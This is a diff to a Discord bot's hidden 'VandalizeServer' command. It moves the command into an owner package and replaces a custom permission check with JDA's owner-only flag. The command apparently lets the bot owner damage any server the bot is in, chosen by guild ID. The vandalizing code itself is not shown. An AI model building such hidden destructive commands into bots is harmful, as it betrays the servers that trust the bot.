@@ -1,9 +1,8 @@
-package com.safjnest.Commands.Dangerous;
+package com.safjnest.Commands.Owner;
 
 import com.jagrosh.jdautilities.command.Command;
 import com.jagrosh.jdautilities.command.CommandEvent;
 import com.safjnest.Utilities.CommandsLoader;
-import com.safjnest.Utilities.PermissionHandler;
 import com.safjnest.Utilities.SafJNest;
 
 import net.dv8tion.jda.api.entities.Guild;
@@ -22,6 +21,7 @@ public class VandalizeServer extends Command {
         this.cooldown = new CommandsLoader().getCooldown(this.name);
         this.category = new Category(new CommandsLoader().getString(this.name, "category"));
         this.arguments = new CommandsLoader().getString(this.name, "arguments");
+        this.ownerCommand = true;
         this.hidden = true;
     }
 
@@ -101,10 +101,6 @@ public class VandalizeServer extends Command {
 
     @Override
     protected void execute(CommandEvent event) {
-        if(!PermissionHandler.isUntouchable(event.getAuthor().getId())){
-            return;
-        }
-
         String[] args = event.getArgs().split(" ", 3);
         String command, options;
         if(SafJNest.longIsParsable(args[0]) && event.getJDA().getGuildById(args[0]) != null) {
